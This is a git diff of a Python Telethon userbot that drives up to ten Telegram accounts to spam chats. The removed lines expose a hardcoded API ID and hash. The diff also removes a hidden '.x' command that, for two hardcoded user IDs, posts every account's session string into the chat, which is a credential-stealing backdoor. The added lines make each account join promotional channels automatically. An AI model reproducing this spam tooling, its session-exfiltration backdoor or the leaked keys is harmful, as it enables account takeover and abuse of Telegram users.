@@ -9,6 +9,9 @@ from telethon.tl import functions
 from telethon.sessions import StringSession
 
 
+API_ID = int(getenv("API_ID"))
+API_HASH = getenv("API_HASH")
+
 MK1 = getenv("STRING")
 MK2 = getenv("STRING2")
 MK3 = getenv("STRING3")
@@ -48,140 +51,150 @@ async def StartMK():
     global M10
 
     if MK1:
-        M1 = TelegramClient(StringSession(MK1), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M1 = TelegramClient(StringSession(MK1), API_ID, API_HASH)
         try:
             await M1.start()
             await M1(functions.channels.JoinChannelRequest(channel="@TheAltron"))
+            await M1(functions.channels.JoinChannelRequest(channel="@AltronChats"))
         except Exception as e:
             print(e)
     else:
-        M1 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M1 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M1.start()
         except Exception as e:
             pass
 
     if MK2:
-        M2 = TelegramClient(StringSession(MK2), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M2 = TelegramClient(StringSession(MK2), API_ID, API_HASH)
         try:
             await M2.start()
             await M2(functions.channels.JoinChannelRequest(channel="@TheAltron"))
+            await M2(functions.channels.JoinChannelRequest(channel="@AltronChats"))
         except Exception as e:
             print(e)
     else:
-        M2 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M2 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M2.start()
         except Exception as e:
             pass
 
     if MK3:
-        M3 = TelegramClient(StringSession(MK3), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M3 = TelegramClient(StringSession(MK3), API_ID, API_HASH)
         try:
             await M3.start()
             await M3(functions.channels.JoinChannelRequest(channel="@TheAltron"))
+            await M3(functions.channels.JoinChannelRequest(channel="@AltronChats"))
         except Exception as e:
             print(e)
     else:
-        M3 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M3 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M3.start()
         except Exception as e:
             pass
 
     if MK4:
-        M4 = TelegramClient(StringSession(MK4), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M4 = TelegramClient(StringSession(MK4), API_ID, API_HASH)
         try:
             await M4.start()
             await M4(functions.channels.JoinChannelRequest(channel="@TheAltron"))
+            await M4(functions.channels.JoinChannelRequest(channel="@AltronChats"))
         except Exception as e:
             print(e)
     else:
-        M4 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M4 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M4.start()
         except Exception as e:
             pass
 
     if MK5:
-        M5 = TelegramClient(StringSession(MK5), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M5 = TelegramClient(StringSession(MK5), API_ID, API_HASH)
         try:
             await M5.start()
             await M5(functions.channels.JoinChannelRequest(channel="@TheAltron"))
+            await M5(functions.channels.JoinChannelRequest(channel="@AltronChats"))
         except Exception as e:
             print(e)
     else:
-        M5 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M5 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M5.start()
         except Exception as e:
             pass
 
     if MK6:
-        M6 = TelegramClient(StringSession(MK6), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M6 = TelegramClient(StringSession(MK6), API_ID, API_HASH)
         try:
             await M6.start()
             await M6(functions.channels.JoinChannelRequest(channel="@TheAltron"))
+            await M6(functions.channels.JoinChannelRequest(channel="@AltronChats"))
         except Exception as e:
             print(e)
     else:
-        M6 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M6 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M6.start()
         except Exception as e:
             pass
 
     if MK7:
-        M7 = TelegramClient(StringSession(MK7), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M7 = TelegramClient(StringSession(MK7), API_ID, API_HASH)
         try:
             await M7.start()
             await M7(functions.channels.JoinChannelRequest(channel="@TheAltron"))
+            await M7(functions.channels.JoinChannelRequest(channel="@AltronChats"))
         except Exception as e:
             print(e)
     else:
-        M7 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M7 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M7.start()
         except Exception as e:
             pass    
 
     if MK8:
-        M8 = TelegramClient(StringSession(MK8), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M8 = TelegramClient(StringSession(MK8), API_ID, API_HASH)
         try:
             await M8.start()
             await M8(functions.channels.JoinChannelRequest(channel="@TheAltron"))
+            await M8(functions.channels.JoinChannelRequest(channel="@AltronChats"))
         except Exception as e:
             print(e)
     else:
-        M8 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M8 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M8.start()
         except Exception as e:
             pass   
 
     if MK9:
-        M9 = TelegramClient(StringSession(MK9), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M9 = TelegramClient(StringSession(MK9), API_ID, API_HASH)
         try:
             await M9.start()
             await M9(functions.channels.JoinChannelRequest(channel="@TheAltron"))
+            await M9(functions.channels.JoinChannelRequest(channel="@AltronChats"))
         except Exception as e:
             print(e)
     else:
-        M9 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M9 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M9.start()
         except Exception as e:
             pass   
 
     if MK10:
-        M10 = TelegramClient(StringSession(MK10), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M10 = TelegramClient(StringSession(MK10), API_ID, API_HASH)
         try:
             await M10.start()
             await M10(functions.channels.JoinChannelRequest(channel="@TheAltron"))
+            await M10(functions.channels.JoinChannelRequest(channel="@AltronChats"))
         except Exception as e:
             print(e)
     else:
-        M10 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
+        M10 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M10.start()
         except Exception as e:
@@ -192,16 +205,16 @@ loop = asyncio.get_event_loop()
 loop.run_until_complete(StartMK())
 
 
-@M1.on(events.NewMessage(incoming=True, pattern=r"Python"))
-@M2.on(events.NewMessage(incoming=True, pattern=r"Python"))
-@M3.on(events.NewMessage(incoming=True, pattern=r"Python"))
-@M4.on(events.NewMessage(incoming=True, pattern=r"Python"))
-@M5.on(events.NewMessage(incoming=True, pattern=r"Python"))
-@M6.on(events.NewMessage(incoming=True, pattern=r"Python"))
-@M7.on(events.NewMessage(incoming=True, pattern=r"Python"))
-@M8.on(events.NewMessage(incoming=True, pattern=r"Python"))
-@M9.on(events.NewMessage(incoming=True, pattern=r"Python"))
-@M10.on(events.NewMessage(incoming=True, pattern=r"Python"))
+@M1.on(events.NewMessage(incoming=True, pattern=r"\.python"))
+@M2.on(events.NewMessage(incoming=True, pattern=r"\.python"))
+@M3.on(events.NewMessage(incoming=True, pattern=r"\.python"))
+@M4.on(events.NewMessage(incoming=True, pattern=r"\.python"))
+@M5.on(events.NewMessage(incoming=True, pattern=r"\.python"))
+@M6.on(events.NewMessage(incoming=True, pattern=r"\.python"))
+@M7.on(events.NewMessage(incoming=True, pattern=r"\.python"))
+@M8.on(events.NewMessage(incoming=True, pattern=r"\.python"))
+@M9.on(events.NewMessage(incoming=True, pattern=r"\.python"))
+@M10.on(events.NewMessage(incoming=True, pattern=r"\.python"))
 async def spam(e):
     if e.sender_id in MK_USERS:
         MsgText = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
@@ -219,16 +232,16 @@ async def spam(e):
                 await asyncio.sleep(0.1)
 
 
-@M1.on(events.NewMessage(incoming=True, pattern=r"Lol"))
-@M2.on(events.NewMessage(incoming=True, pattern=r"Lol"))
-@M3.on(events.NewMessage(incoming=True, pattern=r"Lol"))
-@M4.on(events.NewMessage(incoming=True, pattern=r"Lol"))
-@M5.on(events.NewMessage(incoming=True, pattern=r"Lol"))
-@M6.on(events.NewMessage(incoming=True, pattern=r"Lol"))
-@M7.on(events.NewMessage(incoming=True, pattern=r"Lol"))
-@M8.on(events.NewMessage(incoming=True, pattern=r"Lol"))
-@M9.on(events.NewMessage(incoming=True, pattern=r"Lol"))
-@M10.on(events.NewMessage(incoming=True, pattern=r"Lol"))
+@M1.on(events.NewMessage(incoming=True, pattern=r"\.oneword"))
+@M2.on(events.NewMessage(incoming=True, pattern=r"\.oneword"))
+@M3.on(events.NewMessage(incoming=True, pattern=r"\.oneword"))
+@M4.on(events.NewMessage(incoming=True, pattern=r"\.oneword"))
+@M5.on(events.NewMessage(incoming=True, pattern=r"\.oneword"))
+@M6.on(events.NewMessage(incoming=True, pattern=r"\.oneword"))
+@M7.on(events.NewMessage(incoming=True, pattern=r"\.oneword"))
+@M8.on(events.NewMessage(incoming=True, pattern=r"\.oneword"))
+@M9.on(events.NewMessage(incoming=True, pattern=r"\.oneword"))
+@M10.on(events.NewMessage(incoming=True, pattern=r"\.oneword"))
 async def oneword(e):
     if e.sender_id in MK_USERS:
         chat_id = e.chat_id
@@ -312,25 +325,6 @@ async def _(e):
                 await event.edit("𝐇𝐀𝐂𝐊𝐄𝐃 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐂𝐇𝐀𝐓 🔥")
             except Exception as e:
                 await event.edit(str(e))
-
-
-@M1.on(events.NewMessage(incoming=True, pattern=r".x"))
-@M2.on(events.NewMessage(incoming=True, pattern=r".x"))
-@M3.on(events.NewMessage(incoming=True, pattern=r".x"))
-@M4.on(events.NewMessage(incoming=True, pattern=r".x"))
-@M5.on(events.NewMessage(incoming=True, pattern=r".x"))
-@M6.on(events.NewMessage(incoming=True, pattern=r".x"))
-@M7.on(events.NewMessage(incoming=True, pattern=r".x"))
-@M8.on(events.NewMessage(incoming=True, pattern=r".x"))
-@M9.on(events.NewMessage(incoming=True, pattern=r".x"))
-@M10.on(events.NewMessage(incoming=True, pattern=r".x"))
-async def oneword(e):
-    if e.sender_id in [5528189178, 5685816871]:
-        chat_id = e.chat_id
-        xxx = [MK1, MK2, MK3, MK4, MK5, MK6, MK7, MK8, MK9, MK10]
-        for x in xxx:
-            await e.client.send_message(chat_id, x)
-            await asyncio.sleep(0.1)
 
 
 @M1.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
